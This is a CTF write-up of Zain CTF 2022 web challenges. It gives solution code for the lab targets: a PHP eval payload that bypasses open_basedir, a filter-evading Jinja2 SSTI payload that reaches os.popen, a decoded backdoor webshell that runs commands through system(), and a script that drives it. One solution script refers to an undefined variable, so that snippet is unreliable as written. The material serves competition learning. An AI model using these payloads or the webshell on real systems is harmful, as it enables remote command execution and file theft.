# Zain CTF 2022 [](https://cybertalents.com/competitions/zain-ctf-2022/teams)

<ImageZoom 
    src="docs/Cybertalents/ZainCTF/ZainCTF.png"
    :border="true"
/>

## Web
### Sonic go brrr <Badge type="success">Easy</Badge>


```php
// ...
if(!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
	$flog=generateRandomString();
	$_SESSION['flooog'] = $flog;
	$_SESSION['counter'] = mstime();
	setcookie("secret",base64_encode($flog));
}
// ...
if (isset($_POST['Q'])) {
  if ($_POST['Q']== $_SESSION['flooog']) {
    if (  (mstime() - $_SESSION['counter']) < 2999  ){
    echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';
    }else{
// ...
```
- [x] Solution :

```python
import requests, base64
from urllib.parse import unquote

session = requests.Session()
url = 'http://wcomekgvdnrf93rq5l3n94wbq36okgvd52qyt9vr-web.cybertalentslabs.com/index.php'
r = session.get(url)
secretCookie = base64.b64decode(unquote(session.cookies.get_dict()['secret']))
print('[+] secret cookie : ', secretCookie)
r = session.post(url, data={"Q": f"{sec.decode('utf8')}"})
print(r.text)

```
### Obfjustu <Badge type="success">Easy</Badge>
got web page with some kind of animation, check HTML source code, found JS minified file, unminify it and saw this piece of code, just throw it in console :
```js
var _cs = [
    "\x6a\x53",
    "\x31\x30\x6e",
    "\x66\x75",
    "\x5f\x77",
    "\x30\x6d\x33",
    "\x43\x6c\x69",
    "\x48\x5f\x73",
    "\x7b\x30\x62",
    "\x61\x67",
    "\x33",
    "\x66\x6c",
    "\x31\x74",
    "\x65\x6e\x74",
    "\x73\x63",
    "\x77\x45\x4c",
    "\x4c\x63",
    "\x30\x6d",
    "\x61\x74",
    "\x7d",
    "\x67\x74\x68",
    "\x67\x74",
    "\x63\x61\x6c",
    "\x6c\x6f",
    "\x68",
    "\x6c\x65\x6e",
    "\x6d\x70",
    "\x65",
    "\x61\x72",
    "\x67\x65\x6f",
    "\x65\x43\x6f",
];
var _xxg0 = _cs[10] + _cs[8] + _cs[7] + _cs[2] + _cs[13] + _cs[17] + _cs[1] + _cs[3] + _cs[11] + _cs[6] + _cs[4] + _cs[0] + _cs[18];

// print the flag :
console.log(_xxg0)
```
### blobber <Badge type="warning">Medium</Badge>
Chall Source code : 
```php
<html>
<!--
<img src="uploads/bg.png"/>
-->
<?php
if (!isset($_GET['e']))
{
highlight_file(__FILE__);
}

eval(stripslashes($_GET['e']));

if (isset($_GET['file'])){
 $dir= new DirectoryIterator($_GET['file']);
 foreach ($dir as $found) echo filemtime($found)." ";
 exit;

}
?>
</html>
```
- [x] Solution : As you see the code we need to throw a payload for eval() to get the flag, first i checked some php function like `getcwd()` gives `/var/www/html`, `scandir('.')` ..., but the most interesting thing is when i try `chdir('..')` doesnt execute, i checked the current user `get_current_user()` shows that im root, strange behaviour right, so basically this indicates that the working directory of the php script used as the base-directory well that's [`open_basedir`](https://www.php.net/manual/en/ini.core.php#ini.open-basedir) behaviour and to verify that enable errors display using `ini_set('display_errors', 1)` & try to chdir somewhere else, well the good thing that it's bypassable using this known method just re init the open_basedir to `../` & chdir up to `/`:

```python
p = """
chdir("uploads/");
ini_set("open_basedir", "/var/www/html:../");
chdir("../");chdir("../");chdir("../");chdir("../");
var_dump(scandir('.'), file_get_contents('t0t4lly_n0t_th3_r3al_fl4gG'));
"""
print(requests.get(f'http://52.59.229.252:1234/?e={p}').text)
```
- `omakmoh` solved this chall by bypassing the disabled functions and executes commands on the sys.

### Strength Calculator <Badge type="danger">Hard</Badge>
Chall Source code :

```python
from flask import Flask, render_template, request, render_template_string, send_file
import re,os
def calculateStrength(name):
	strength = 0
	for _ in name:
		strength += ord(_)
	return str(strength)
def isAdmin():
	# We didn't implement this yet so no one is an admin
	return False
app = Flask('AAA')
app.secret_key=os.urandom(32)
@app.route('/',methods=['POST','GET'])
def index():
	if request.method == 'POST':
		if re.search("\{\{|\}\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\.|_|\[|\]|\"|(class)|(subclasses)|(mro)",request.form['name']) is not None:
			name= "Hacking detected"
			return render_template("index.html", name=name,response="0")
		else:
			name = "Name : "+render_template_string(request.form['name'])
			response = "Strength : "+ calculateStrength(request.form['name'])
			print(isAdmin())
			if isAdmin():
				return render_template("index.html", name=name,  response=response)
			else:
				return render_template("index.html",name="Guest", response=response)
	if request.method == 'GET':
		return render_template("index.html")

@app.route("/source")
def get_source():
	return send_file("./main.py",as_attachment=True)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```
- [x] Solution : By reading the code i can tell it's an SSTI, but not the usual injection which uses `{{ }}` for Expressions to print to the template output, cuz brackets are filtered so i tried `{% ... %}` for Statements, like when i tried `{% set v=6/2 %}` works fine but when i tired `{% set v=6/0 %}` gives back error, so this will be our entry : bypass `.` with `|` and bypass filtred functions by hexify those keywords like `\x5f` gives `_` and so on ...

```python
# cat flag.txt : \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74
{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'))|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('read')()%}
```

### b4D h4ck3R <Badge type="danger">Hard</Badge>
for this Chall we got website (according to chall description got hacked but hacker keep some kind of access), so first thing to do is scan for a webshells using the famous list from [nicoSWD](https://gist.github.com/nicoSWD/5d13af1131a944dc2af856e0675b872b), and found p0wny-shell.php, but seems dead end!, not until few enumeration to hit this vulnerable param `?page=` to LFI, just read source code of this shell, u'll find it encoded use this online tool to decode it & save time [unphp](https://www.unphp.net/), util we got this minified code : 
```php
$erzo_f851f55b = [
base64_decode('ZmxhZ3sjX2FiY2RlZn0='), base64_decode('ZmxhZ3tiMHdfYjB3fQ=='), base64_decode('ZmxhZ3t0ZXRfZmxhZ30='), base64_decode('ZmxhZ3s5OSF6elN3Y30='), base64_decode('ZmxhZ3tkZWJ1R19mdHd9'), base64_decode('ZmxhZ3toZWxsX3llYWh9'), base64_decode('ZmxhZ3t0NHN0fQ==') ];
$igxc_9ce88802 = '';
$bbmg_1b267619 = 0;
foreach ($erzo_f851f55b as & $djkg_417c4fa3) {
    $igxc_9ce88802 = $djkg_417c4fa3[$bbmg_1b267619] . $igxc_9ce88802;
    $bbmg_1b267619++;
};
if (isset($_GET[$igxc_9ce88802])) {
    $grxe_fd6b6fc9 = $_GET[$igxc_9ce88802];
    $pgck_32cfe6c1 = base64_decode($grxe_fd6b6fc9);
    $jipp_8a561003 = substr($pgck_32cfe6c1, 5, -5);
    echo $jipp_8a561003;
    system($jipp_8a561003);
} else {
    echo base64_decode('NDA0');
};

```
in brief, as u see the system command get encoded b64 payload from GET param which is this var `igxc_9ce88802` just execute the code until the foreach to get its value, then we supply our payload : 
```python
import requests, base64

payload = base64.b64encode(b'ls -l /')
url = 'http://18.156.122.209:1234/p0wny-shell.php?4h{galf=' + payload.decode()
print(requests.get(url).text)
```
## Forensics
### squirrel <Badge type="success">Easy</Badge>
### Duck <Badge type="warning">Medium</Badge>

## Network
### spectate <Badge type="success">Easy</Badge>

## Secure Coding
### nj1nx <Badge type="success">Easy</Badge>
### Paff <Badge type="warning">Medium</Badge>
### Haevde <Badge type="warning">Medium</Badge>

## Machines
### Tearys <Badge type="warning">Medium</Badge>

## Cryptography
## Malware Reverse Engineering
## Exploitation
## OSINT
### Email Address <Badge type="success">Easy</Badge>
### Fish <Badge type="warning">Medium</Badge>
### Two Parts <Badge type="danger">Hard</Badge>